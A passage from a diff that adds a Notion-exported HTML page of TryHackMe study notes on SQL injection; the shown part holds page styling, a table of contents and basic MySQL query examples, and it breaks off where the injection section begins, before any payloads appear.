@@ -1,0 +1,738 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Intro into Web Hacking - SQL Injection</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+/* Override strong tags inside headings to maintain consistent weight */
+h1 strong,
+h2 strong,
+h3 strong {
+	font-weight: 600;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 10px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.collection-content td {
+	white-space: pre-wrap;
+	word-break: break-word;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+	margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.callout img.notion-static-icon {
+	width: 1em;
+	height: 1em;
+}
+
+.callout p {
+	margin: 0;
+}
+
+.callout h1,
+.callout h2,
+.callout h3 {
+	margin: 0 0 0.6rem;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+blockquote.quote-large {
+	font-size: 1.25em;
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", "Noto Sans Arabic", "Noto Sans Hebrew", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.highlight-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.highlight-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.highlight-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.highlight-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.highlight-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.highlight-default_background {
+	color: rgba(44, 44, 43, 1);
+}
+.highlight-gray_background {
+	background: rgba(42, 28, 0, 0.07);
+}
+.highlight-brown_background {
+	background: rgba(139, 46, 0, 0.086);
+}
+.highlight-orange_background {
+	background: rgba(224, 101, 1, 0.129);
+}
+.highlight-yellow_background {
+	background: rgba(211, 168, 0, 0.137);
+}
+.highlight-teal_background {
+	background: rgba(0, 100, 45, 0.09);
+}
+.highlight-blue_background {
+	background: rgba(0, 124, 215, 0.094);
+}
+.highlight-purple_background {
+	background: rgba(102, 0, 178, 0.078);
+}
+.highlight-pink_background {
+	background: rgba(197, 0, 93, 0.086);
+}
+.highlight-red_background {
+	background: rgba(223, 22, 0, 0.094);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(125, 122, 117, 1);
+	fill: rgba(125, 122, 117, 1);
+}
+.block-color-brown {
+	color: rgba(159, 118, 90, 1);
+	fill: rgba(159, 118, 90, 1);
+}
+.block-color-orange {
+	color: rgba(210, 123, 45, 1);
+	fill: rgba(210, 123, 45, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 148, 52, 1);
+	fill: rgba(203, 148, 52, 1);
+}
+.block-color-teal {
+	color: rgba(80, 148, 110, 1);
+	fill: rgba(80, 148, 110, 1);
+}
+.block-color-blue {
+	color: rgba(56, 125, 201, 1);
+	fill: rgba(56, 125, 201, 1);
+}
+.block-color-purple {
+	color: rgba(154, 107, 180, 1);
+	fill: rgba(154, 107, 180, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(207, 81, 72, 1);
+	fill: rgba(207, 81, 72, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(240, 239, 237, 1);
+}
+.block-color-brown_background {
+	background: rgba(245, 237, 233, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 235, 222, 1);
+}
+.block-color-yellow_background {
+	background: rgba(249, 243, 220, 1);
+}
+.block-color-teal_background {
+	background: rgba(232, 241, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(229, 242, 252, 1);
+}
+.block-color-purple_background {
+	background: rgba(243, 235, 249, 1);
+}
+.block-color-pink_background {
+	background: rgba(250, 233, 241, 1);
+}
+.block-color-red_background {
+	background: rgba(252, 233, 231, 1);
+}
+.select-value-color-default { background-color: rgba(42, 28, 0, 0.07); }
+.select-value-color-gray { background-color: rgba(28, 19, 1, 0.11); }
+.select-value-color-brown { background-color: rgba(127, 51, 0, 0.156); }
+.select-value-color-orange { background-color: rgba(196, 88, 0, 0.203); }
+.select-value-color-yellow { background-color: rgba(209, 156, 0, 0.282); }
+.select-value-color-green { background-color: rgba(0, 96, 38, 0.156); }
+.select-value-color-blue { background-color: rgba(0, 118, 217, 0.203); }
+.select-value-color-purple { background-color: rgba(92, 0, 163, 0.141); }
+.select-value-color-pink { background-color: rgba(183, 0, 78, 0.152); }
+.select-value-color-red { background-color: rgba(206, 24, 0, 0.164); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="25d3eecd-ed53-80bf-b2ce-d1a09a41f865" class="page sans"><header><img class="page-cover-image" src="https://www.notion.so/images/page-cover/gradients_5.png" style="object-position:center 40%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="LazyAdmin/favicon.png"/></div><h1 class="page-title" dir="auto">Intro into Web Hacking - SQL Injection</h1><p class="page-description" dir="auto"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/list_gray.svg" style="width:14px;height:14px;display:block"/></span>Category</th><td><span class="selected-value select-value-color-red">Red Team</span><span class="selected-value select-value-color-green">SQL Injection</span><span class="selected-value select-value-color-red">Web</span></td></tr><tr class="property-row property-row-file"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/attachment_gray.svg" style="width:14px;height:14px;display:block"/></span>Cover Image</th><td><span style="margin-inline-end:6px"><a href="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/86d8d3b6995ddad46f5d9142354b65b1.png"><img style="width:20px;max-height:24px" src="Intro%20into%20Web%20Hacking%20-%20SQL%20Injection/86d8d3b6995ddad46f5d9142354b65b1.png" alt="86d8d3b6995ddad46f5d9142354b65b1.png"/></a></span></td></tr><tr class="property-row property-row-date"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/calendar_gray.svg" style="width:14px;height:14px;display:block"/></span>Date Completed</th><td><time>@November 26, 2025</time></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/arrow-circle-down_gray.svg" style="width:14px;height:14px;display:block"/></span>Difficulty</th><td><span class="selected-value select-value-color-yellow">Medium</span></td></tr><tr class="property-row property-row-select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/arrow-circle-down_gray.svg" style="width:14px;height:14px;display:block"/></span>Platform</th><td><span class="selected-value select-value-color-green">TryHackMe</span></td></tr><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/list_gray.svg" style="width:14px;height:14px;display:block"/></span>Skills Learned</th><td><span class="selected-value select-value-color-orange">Blind SQLi</span><span class="selected-value select-value-color-purple">In-Band SQli</span><span class="selected-value select-value-color-red">Out of Band SQLi</span><span class="selected-value select-value-color-default">Time Based SQLi</span></td></tr><tr class="property-row property-row-status"><th><span class="icon property-icon"><img src="https://www.notion.so/icons/burst_gray.svg" style="width:14px;height:14px;display:block"/></span>Status</th><td><span class="status-value select-value-color-green"><div class="status-dot status-dot-color-green"></div>Done</span></td></tr></tbody></table></header><div class="page-body"><div style="display:contents" dir="ltr"><nav id="25d3eecd-ed53-802c-a98c-cbd78ee53e37" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#25d3eecd-ed53-8029-8787-e522254ff85f">SQL</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#25d3eecd-ed53-8000-b914-ed9a53cb1590">SQL Injection</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#25d3eecd-ed53-806d-8a67-fc46b0e8d2a7">In-Band SQLi</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#25d3eecd-ed53-8050-8c67-e29808bc1441">Blind SQLi</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#25e3eecd-ed53-8069-b309-f8c0a31e8b3e">Authentication Bypass</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#25e3eecd-ed53-8065-b9b7-e98e925e91d0">Boolean Based</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#25e3eecd-ed53-8009-93d2-f49f594fccc0">Time Based</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#25e3eecd-ed53-807f-830d-cd1225076dce">Out of Band </a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#25e3eecd-ed53-8060-8366-e8924544b0e2">Remediation</a></div></nav></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-8060-b4be-ff318c33c41e" class="">When a web application communicates with a database using the input from the user that hasn’t been properly validated/sanitized it could lead to retrieval/altering of unauthorized data.</p></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-8030-b6b5-ee9687313da3" class="">Databases are managed by DBMS (Database Management Systems) and they can be classified into relational and non-relational. In this module we will be focusing on relational database, the common DBMS we will come across are MySQL, PostgreSQL, Microsoft SQL Server, Access and SQLite.</p></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-80d4-849a-ca954d7372f8" class="">Column referred to as field.</p></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-8043-a809-e3a8ca737225" class="">Key field helps in finding that exact row in a table.</p></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-805a-b8d4-fc0e7371a78d" class="">The table contains a unique ID called the primary key, and a foreign key that establish a relation between the tables (not necessary, even primary key can be used).</p></div><div style="display:contents" dir="auto"><h2 id="25d3eecd-ed53-8029-8787-e522254ff85f" class="">SQL</h2></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-8079-9a3f-f084eb9d6b55" class="">SQL syntax is not case-sensitive, and the below commands are based on MySQL.</p></div><div style="display:contents" dir="auto"><ul id="25d3eecd-ed53-8040-b7f0-e6476a73ea9a" class="bulleted-list"><li style="list-style-type:disc">SELECT- used to retrieve data from the database.<div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-802d-a837-de4a495358ce" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">select * from users;
+select username,password from users;
+select * from users LIMIT 1;
+select * from users LIMIT 1,1;(skips 1 row and return 1 row after the skip)
+select * from users LIMIT 2,1; (skips 2 rows and returns 1 row after the skip)
+In LIMIT the first number indicates the no of rows to skip and 
+the second number indicates the no of rows to return.
+select * from users WHERE username=&#x27;admin&#x27;;
+select * from users WHERE username != &#x27;admin&#x27;;
+select * from users WHERE username=&#x27;admin&#x27; OR username=&#x27;jon&#x27;;
+select * from users WHERE username=&#x27;admin&#x27; AND password=&#x27;p4ssword&#x27;;
+select * from users WHERE username LIKE &#x27;a%&#x27;; (will return the row with username that start with a)
+select * from users WHERE username LIKE &#x27;%n&#x27;; (will return the row with username that ends with n)
+select * from users WHERE username LIKE &#x27;%mi%&#x27;; ( will return rows with username that contains &#x27;mi&#x27;)
+select name,address,city,postcode from customers UNION select company, address, city, postcode from suppliers;
+(When using UNION we have to check if the columns that are combined from different 
+tables are of the same datatype.)
+</code></pre></div></li></ul></div><div style="display:contents" dir="auto"><ul id="25d3eecd-ed53-8030-8029-e65f8e2760ce" class="bulleted-list"><li style="list-style-type:disc">INSERT - used to insert data into database.<div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-80b6-aa92-db9542dda11e" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">insert into users (username,password) values (&#x27;bob&#x27;, &#x27;password123&#x27;);</code></pre></div></li></ul></div><div style="display:contents" dir="auto"><ul id="25d3eecd-ed53-806f-9a1b-e08703da88b2" class="bulleted-list"><li style="list-style-type:disc">UPDATE - used to update one or more than one row in a database.<div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-80bf-82a1-c0c293013ded" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">update users SET username=&#x27;root&#x27;,password=&#x27;pass123&#x27; where username=&#x27;admin&#x27;;</code></pre></div></li></ul></div><div style="display:contents" dir="auto"><ul id="25d3eecd-ed53-8098-8ec4-d71fcaadb74b" class="bulleted-list"><li style="list-style-type:disc">DELETE - used to delete one or more rows in a database, similar to the select we could use the WHERE clause and LIMIT clause specifically.<div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="25d3eecd-ed53-809a-ab6c-e53adbb340ca" class="code code-wrap"><code class="language-SQL" style="white-space:pre-wrap;word-break:break-all">delete from users where username=&#x27;martin&#x27;;
+delete from user; (Since no WHERE clause is used all the data from users table will be deleted)</code></pre></div></li></ul></div><div style="display:contents" dir="auto"><h2 id="25d3eecd-ed53-8000-b914-ed9a53cb1590" class="">SQL Injection</h2></div><div style="display:contents" dir="auto"><p id="25d3eecd-ed53-80ac-92db-d42c2d4afb1a" class="">Injection happens when a web application uses user input in its SQL query.</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" 